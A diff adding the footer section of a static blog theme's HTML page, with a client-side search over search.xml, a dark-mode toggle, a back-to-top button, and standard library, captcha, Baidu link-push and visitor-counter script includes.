+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
